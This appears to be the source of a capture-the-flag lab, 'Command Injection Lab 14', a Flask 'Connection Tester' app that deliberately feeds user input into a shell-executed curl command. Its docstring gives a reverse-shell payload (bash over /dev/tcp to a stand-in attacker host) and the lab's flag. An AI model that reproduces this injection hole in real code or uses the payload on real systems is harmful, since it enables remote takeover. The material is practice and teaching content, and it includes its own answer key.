"""
Command Injection Lab 14: Reverse Shell
Difficulty: 3 (Advanced)
Type: Command Injection
Points: 100

Description:
Creating reverse shell connections through command injection.
"""

from flask import Flask, request, render_template_string
import subprocess

app = Flask(__name__)

TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Connection Tester</title>
    <style>
        body { font-family: Arial; margin: 20px; }
        input { padding: 8px; width: 300px; }
        button { padding: 8px 15px; }
        #output { margin-top: 20px; background: #f0f0f0; padding: 10px; white-space: pre; max-height: 400px; overflow: auto; }
    </style>
</head>
<body>
    <h1>Connection Tester</h1>
    <form method="GET">
        <input type="text" name="server" placeholder="Enter server" value="{{ server }}">
        <button type="submit">Test</button>
    </form>
    {% if output %}
    <h3>Status:</h3>
    <div id="output">{{ output }}</div>
    {% endif %}
</body>
</html>
"""

@app.route('/', methods=['GET'])
def index():
    """
    Vulnerable reverse shell injection
    
    Attack Vector:
    /?server=localhost; bash -i >& /dev/tcp/attacker/port 0>&1
    
    Flag: FLAG{cmd_injection_reverse_shell_014}
    """
    server = request.args.get('server', '')
    output = ''
    
    if server:
        try:
            # VULNERABLE: Allows reverse shell commands
            cmd = f"curl -s http://{server}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
            output = result.stdout + result.stderr
        except Exception as e:
            output = f"Error: {str(e)}"
    
    return render_template_string(TEMPLATE, server=server, output=output)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5014, debug=False)
